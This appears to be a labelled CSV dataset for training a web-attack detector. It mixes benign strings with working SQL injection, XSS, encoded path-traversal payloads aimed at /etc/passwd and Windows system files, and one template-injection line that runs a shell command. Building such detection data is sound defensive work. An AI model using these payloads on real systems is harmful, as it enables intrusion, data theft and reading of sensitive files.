"payload","label"
"%c0%ae%c0%ae%c1%pc%c0%ae%c0%ae%c1%pc%c0%ae%c0%ae%c1%pc%c0%ae%c0%ae%c1%pc%c0%ae%c0%ae%c1%pcboot.ini","Suspicious"
"<li><a href=""/wiki/Evolutionary_programming"" title=""Evolutionary programming"">Evolutionary programming </a> </li>","Normal"
"1' where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --","SQLi"
"%%c0%6e%c0%6e%f8%80%80%80%af%%c0%6e%c0%6e%f8%80%80%80%af%%c0%6e%c0%6e%f8%80%80%80%af%%c0%6e%c0%6e%f8%80%80%80%af%%c0%6e%c0%6e%f8%80%80%80%afetc%f8%80%80%80%afissue","Suspicious"
"<li id=""cite_note-Symbolic_vs._sub-symbolic-18""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Symbolic_vs._sub-symbolic_18-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Symbolic_vs._sub-symbolic_18-1""><sup><i><b>b </b> </i> </sup> </a>","Normal"
"1"" where 2394 = 2394 and 8831 = 8333--","SQLi"
".%2e%c0%2f.%2e%c0%2f.%2e%c0%2f.%2e%c0%2fetc%c0%2fissue","Suspicious"
"SELECT * FROM fewer","Normal"
"-3326'+ ( select xitp where 7621 = 7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#","SQLi"
"<style>:target {color: red;}</style><br id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></br>","XSS"
".../.%c0%2f.../.%c0%2f.../.%c0%2fetc%c0%2fissue","Suspicious"
"..%f8%80%80%80%af..%f8%80%80%80%af..%f8%80%80%80%af..%f8%80%80%80%af..%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts","Suspicious"
"1  )  )   as rhwg where 8843 = 8843","SQLi"
"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'qvqf'  =  'qvqf","SQLi"
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lzyl"" like ""lzyl","SQLi"
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;248–258, </li>","Normal"
"-7691"" or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #","SQLi"
"%uff0e%uff0e0x5c%uff0e%uff0e0x5c%uff0e%uff0e0x5cetc0x5cissue","Suspicious"
"1' and non_existant_table   =   '1","SQLi"
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag","SQLi"
"However , cardinal reaches 80 longer permitted participate election pope -- falls group 120 &quot; cardinal electors","Normal"
"The Israeli government previously repeatedly warned attempt Syria supply Hezbollah chemical dangerous weapons would crossing &quot; red line &quot; , would result military response","Normal"
"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#","SQLi"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts","Suspicious"
"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--","SQLi"
"07831245k","Normal"
"-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop","SQLi"
"%uff0e%uff0e%c1%8setc%c1%8spasswd","Suspicious"
"1126","Normal"
"$ventador","Normal"
"1%' or sleep ( 5 ) #","SQLi"
"7333720000000000","Normal"
"-8065""   )    )     )   order by 1--","SQLi"
"%252e%252e%c0%af%252e%252e%c0%af%252e%252e%c0%afetc%c0%afissue","Suspicious"
"1' )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( 'xonc' = 'xonc","SQLi"
"%252e%252e0x2f%252e%252e0x2f%252e%252e0x2f%252e%252e0x2f%252e%252e0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts","Suspicious"
"<style>@keyframes slidein {}</style><figcaption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figcaption>","XSS"
"1  )   where 3030  =  3030","SQLi"
"<button draggable=""true"" ondragend=""alert(1)"">test</button>","XSS"
"roncar","Normal"
"<rt onbeforecut=""alert(1)"" contenteditable>test</rt>","XSS"
"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#","SQLi"
"%c0%ee%c0%ee%25c0%25af%c0%ee%c0%ee%25c0%25afetc%25c0%25afpasswd","Suspicious"
"1%"" and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""%"" = ""","SQLi"
"SELECT TOP 3 * FROM actual SELECT * FROM moving 3SELECT * FROM plate","Normal"
"-7499%""  )   union all select 1893,1893,1893,1893,1893#","SQLi"
"those","Normal"
"-9661""  )  )   )  union all select 2158,2158,2158--","SQLi"
".?%25c0%25af.?%25c0%25af.?%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts","Suspicious"
"<ins onmouseover=""alert(1)"">test</ins>","XSS"
"1""  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""bcxh"" like ""bcxh","SQLi"
"-7648'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )","SQLi"
"<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>","XSS"
"bho","Normal"
"2366","Normal"
"<plaintext draggable=""true"" ondragleave=""alert(1)"">test</plaintext>","XSS"
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationstart=""alert(1)""></frameset>","XSS"
"<sub onkeyup=""alert(1)"" contenteditable>test</sub>","XSS"
"SELECT announced ( s )  FROM visit LEFT JOIN","Normal"
"SELECT column_name FROM table_name WHERE EXISTS","Normal"
"<rtc onpointerout=alert(1)>XSS</rtc>","XSS"
"<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>","XSS"
"SELECT * FROM truth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM hall","Normal"
".%2e%c1%8s.%2e%c1%8s.%2e%c1%8s.%2e%c1%8s.%2e%c1%8s.%2e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts","Suspicious"
"3390","Normal"
"05298","Normal"
"SELECT COUNT ( DISTINCT matter )  FROM several","Normal"
"SELECT AVG ( cotton ) FROM mother","Normal"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2216%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2216%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2216%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2216%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2216etc%u2216passwd","Suspicious"
"??0x5cetc0x5cissue","Suspicious"
"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>","XSS"
"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--","SQLi"
"%%c0%6e%c0%6e%c1%pc%%c0%6e%c0%6e%c1%pc%%c0%6e%c0%6e%c1%pcetc%c1%pcissue","Suspicious"
"SELECT * FROM pictured WHERE nuts IN  ( SELECT slept FROM over )","Normal"
"?.%2f?.%2f?.%2f?.%2f?.%2fboot.ini","Suspicious"
"%c0%ee%c0%ee%c0%2f%c0%ee%c0%ee%c0%2f%c0%ee%c0%ee%c0%2f%c0%ee%c0%ee%c0%2f%c0%ee%c0%ee%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts","Suspicious"
"%2e%2e/%2e%2e/%2e%2e/etc/issue","Suspicious"
"0x2e0x2e%f8%80%80%80%afboot.ini","Suspicious"
"SELECT * FROM service ORDER BY connected","Normal"
"SELECT MOD ( 18, 4 ) ;","Normal"
"escuelas 148,","Normal"
"..%c1%8s..%c1%8s..%c1%8s..%c1%8s..%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts","Suspicious"
".%00.%uEFC8boot.ini","Suspicious"
"%f8%80%80%80%ae%f8%80%80%80%ae%f8%80%80%80%af%f8%80%80%80%ae%f8%80%80%80%ae%f8%80%80%80%af%f8%80%80%80%ae%f8%80%80%80%ae%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts","Suspicious"
"..\..\..\..\boot.ini%00index.html","Suspicious"
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv","SQLi"
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>","XSS"
"SELECT * FROM be WHERE clock BETWEEN 'current' AND 'tide'","Normal"
"%f8%80%80%80%ae%f8%80%80%80%ae%f0%80%80%af%f8%80%80%80%ae%f8%80%80%80%ae%f0%80%80%afetc%f0%80%80%afissue","Suspicious"
"%252e%252e\%252e%252e\etc\passwd","Suspicious"
"select sleep ( 5 )  and ""cyrb"" = ""cyrb","SQLi"
"tcito","Normal"
"%5C..%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts","Suspicious"
"8879069271917222","Normal"
"<audio onpointermove=alert(1)>XSS</audio>","XSS"
"whisler","Normal"
"<li id=""cite_note-Intuition-109""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Intuition_109-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Intuition_109-1""><sup><i><b>b </b> </i> </sup> </a>","Normal"
"./.././.././.././.././.././../windows/system32/drivers/etc/hosts","Suspicious"
"..../%c0%af..../%c0%af..../%c0%afboot.ini","Suspicious"
"-8023' or 6872  =  6872","SQLi"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c0%afboot.ini","Suspicious"
"../../../../../usr/local/apache/logs/error.log","Suspicious"
"-3930%""   )    )    order by 1#","SQLi"
"SELECT * FROM happy WHERE road = 'operation' LIMIT 3","Normal"
"${self.context._with_template.module.runtime.util.os.system(""id"")}","Suspicious"
"<details onmousedown=""alert(1)"">test</details>","XSS"
"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --","SQLi"
"%f8%80%80%80%ae%f8%80%80%80%ae%c0%5c%f8%80%80%80%ae%f8%80%80%80%ae%c0%5c%f8%80%80%80%ae%f8%80%80%80%ae%c0%5c%f8%80%80%80%ae%f8%80%80%80%ae%c0%5c%f8%80%80%80%ae%f8%80%80%80%ae%c0%5c%f8%80%80%80%ae%f8%80%80%80%ae%c0%5cboot.ini","Suspicious"
"..%u2216..%u2216..%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts","Suspicious"
"1' )  as ncou where 9166 = 9166 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --","SQLi"
"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'","SQLi"
"%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue","Suspicious"
"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SQLi"
"select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'","SQLi"
"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and 'zlxw' = 'zlxw","SQLi"
"%c0%ee%c0%ee\%c0%ee%c0%ee\%c0%ee%c0%ee\%c0%ee%c0%ee\%c0%ee%c0%ee\%c0%ee%c0%ee\boot.ini","Suspicious"
"plaza esquivias, 68, 5?g","Normal"
"SELECT store ( s ) FROM bare INNER JOIN","Normal"
"coppin@sexl.no","Normal"
"SELECT DAYNAME ( ""2017-06-15 09:34:21"" ) ;","Normal"
"1"" )  where 2839 = 2839 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","SQLi"
"Mr Usher &apos;s instant message group included bankers Barclays Citigroup , people close situation said","Normal"
"<frameset onclick=""alert(1)"">test</frameset>","XSS"
"hsien","Normal"
"SELECT * FROM struck WHERE separate IN  ( 'never', 'tool', 'planning' )","Normal"
"%2e%2e%c1%pcetc%c1%pcpasswd","Suspicious"
"<dialog onmousedown=""alert(1)"">test</dialog>","XSS"
"%f0%80%80%ae%f0%80%80%ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts","Suspicious"
"48638626c","Normal"
"virgen","Normal"
"rio nervion, 177","Normal"
"%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vissue","Suspicious"
"%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts","Suspicious"
"38182378d","Normal"
".../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts","Suspicious"
"%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini","Suspicious"
"select   (  case when   (  5009  =  1133  )   then 5009 else 5009*  (  select 5009 from information_schema.character_sets  )   end  )  #","SQLi"
"<body onfocusout=alert(1) id=x><iframe id=x>","XSS"
"1,  (  select   (  case when   (  5726  =  5275  )   then 1 else 1/  (  select 0  )   end   )    )","SQLi"
"lcera","Normal"
"..%01%2f..%01%2f..%01%2f..%01%2f..%01%2f..%01%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts","Suspicious"
"1""   )    )    as itxo where 7916  =  7916","SQLi"
"0n3r3oscura","Normal"
"-6813   )    )     )   or 6872  =  6872 and    (    (     (  7304  =  7304","SQLi"
"%f8%80%80%80%ae%f8%80%80%80%ae%c0%af%f8%80%80%80%ae%f8%80%80%80%ae%c0%af%f8%80%80%80%ae%f8%80%80%80%ae%c0%af%f8%80%80%80%ae%f8%80%80%80%ae%c0%af%f8%80%80%80%ae%f8%80%80%80%ae%c0%af%f8%80%80%80%ae%f8%80%80%80%ae%c0%afetc%c0%afissue","Suspicious"
"%f0%80%80%ae%f0%80%80%ae/%f0%80%80%ae%f0%80%80%ae/%f0%80%80%ae%f0%80%80%ae/%f0%80%80%ae%f0%80%80%ae/boot.ini","Suspicious"
"joaquin","Normal"
"<style>:target {transform: rotate(180deg);}</style><footer id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></footer>","XSS"
"1%'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","SQLi"
"1""  )   as boeh where 2571  =  2571 union all select null#","SQLi"
"<div draggable=""true"" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>","XSS"
"%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue","Suspicious"
"<hr id=x tabindex=1 onfocus=alert(1)></hr>","XSS"
"<video onclick=""alert(1)"">test</video>","XSS"
"%f8%80%80%80%ae%f8%80%80%80%ae%u2215%f8%80%80%80%ae%f8%80%80%80%ae%u2215%f8%80%80%80%ae%f8%80%80%80%ae%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts","Suspicious"
"%5C..0x2f%5C..0x2f%5C..0x2f%5C..0x2f%5C..0x2f%5C..0x2fboot.ini","Suspicious"
"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SQLi"
"pardip","Normal"
"%f0%80%80%ae%f0%80%80%ae%bg%qf%f0%80%80%ae%f0%80%80%ae%bg%qf%f0%80%80%ae%f0%80%80%ae%bg%qfetc%bg%qfpasswd","Suspicious"
"6bn","Normal"
"-5817' in boolean mode )  union all select 2391,2391,2391,2391,2391--","SQLi"
"%5C..%25c1%259c%5C..%25c1%259c%5C..%25c1%259c%5C..%25c1%259c%5C..%25c1%259cboot.ini","Suspicious"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA../../../../../etc/passwd","Suspicious"
"saree","Normal"
"0x2e0x2e0x5cetc0x5cissue","Suspicious"
"Officers spotted Sarborough , 32 , dropping three bags cocaine lawyer &apos;s home Blackburn , Lancashire , Law Society dinner colleagues","Normal"
"%252e%252e0x5c%252e%252e0x5c%252e%252e0x5c%252e%252e0x5c%252e%252e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts","Suspicious"
"0142716118287558","Normal"
"SELECT * FROM vowel  WHERE soil = giving","Normal"
"1%'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --","SQLi"
"chelva","Normal"
"SELECT valuable ( s )  FROM sport","Normal"
"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","SQLi"
"1%"" )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""%"" = ""","SQLi"
".../.%c1%pcetc%c1%pcissue","Suspicious"
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and 'kird' = 'kird","SQLi"
"1"" where 3318  =  3318","SQLi"
"..../%c0%9v..../%c0%9v..../%c0%9v..../%c0%9v..../%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts","Suspicious"
"1'+ ( select lgkd where 7801 = 7801 and elt ( 4249 = 4249,7259  )  )  +'","SQLi"
"C:/apache/logs/access_log","Suspicious"
"SELECT TOP 3 * FROM crop WHERE further = 'minerals' SELECT * FROM involved","Normal"
"They &apos;t want us dictate makes profitable","Normal"
"sequera de haza, la","Normal"
"select count ( * )  from generate_series ( 1,5000000 ) #","SQLi"
"%5C..%c0%5cetc%c0%5cissue","Suspicious"
"1  )   where 2170  =  2170","SQLi"
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>","XSS"
"SELECT band FROM pink UNION SELECT throw FROM essential ORDER BY lying","Normal"
"../\/../\/windows/\/system32/\/drivers/\/etc/\/hosts","Suspicious"
"78218686x","Normal"
"1"" )  as yzny where 4869 = 4869 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --","SQLi"
"Since Scotland &apos;t Schengen area , continued non-compliance would cheap concession Brussels offer return whatever really wanted Scots","Normal"
"-3436 )  or elt ( 1032 = 1032,3623 )","SQLi"
"??0x2f??0x2f??0x2f??0x2f??0x2fetc0x2fissue","Suspicious"
"1' )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --","SQLi"
"pankiw","Normal"
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;790–831 </li>","Normal"
"torrente zaldvar","Normal"
"5933","Normal"
"%uff0e%uff0e%%35%%63%uff0e%uff0e%%35%%63%uff0e%uff0e%%35%%63%uff0e%uff0e%%35%%63etc%%35%%63passwd","Suspicious"
"-8472' )  where 3340 = 3340 or make_set ( 1752 = 9905,9905 ) --","SQLi"
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( ""poik"" = ""poik","SQLi"
"Morsi &apos;s speech Tahrir Square filled dramatic populist gestures","Normal"
"%5C../%5C../%5C../%5C../%5C../etc/issue","Suspicious"
"1'|| ( select 'fbtm' where 1335 = 1335 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) ||'","SQLi"
"-8773%'  )  )   )  union all select 8941,8941,8941,8941,8941,8941#","SQLi"
"SELECT * FROM learn FETCH FIRST 3 ROWS ONLY","Normal"
"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )","SQLi"
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055","SQLi"
"%f8%80%80%80%ae%f8%80%80%80%ae\%f8%80%80%80%ae%f8%80%80%80%ae\%f8%80%80%80%ae%f8%80%80%80%ae\%f8%80%80%80%ae%f8%80%80%80%ae\etc\passwd","Suspicious"
"chumbiauca","Normal"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i","SQLi"
"1%'   )    )    union all select null,null,null,null,null#","SQLi"
"-4807' where 3232 = 3232 or make_set ( 6599 = 5179,5179 ) --","SQLi"
"1%' or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","SQLi"
"select sleep  (  5  )   and    (    (   'srfc' like 'srfc","SQLi"
"%c0.%c0.%c1%1c%c0.%c0.%c1%1c%c0.%c0.%c1%1c%c0.%c0.%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"%%c0%6e%c0%6e%f0%80%80%af%%c0%6e%c0%6e%f0%80%80%af%%c0%6e%c0%6e%f0%80%80%afetc%f0%80%80%afissue","Suspicious"
"SELECT * FROM jet WHERE country BETWEEN '1996-07-01' AND '1996-07-31'","Normal"
"1' and 7533 = 7533 and 'frvk' = 'frvk","SQLi"
"pl. ceramista gimeno, 43,","Normal"
"%2e%2e%c1%1c%2e%2e%c1%1c%2e%2e%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"..%01%c1%pc..%01%c1%pcetc%c1%pcpasswd","Suspicious"
"Travelling BVB fans created terrible scenes flares Veltins Arena district derby Schalke Borussia Dortmund announced would serious consequences","Normal"
"veneranda","Normal"
"1"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""vnso"" like ""vnso","SQLi"
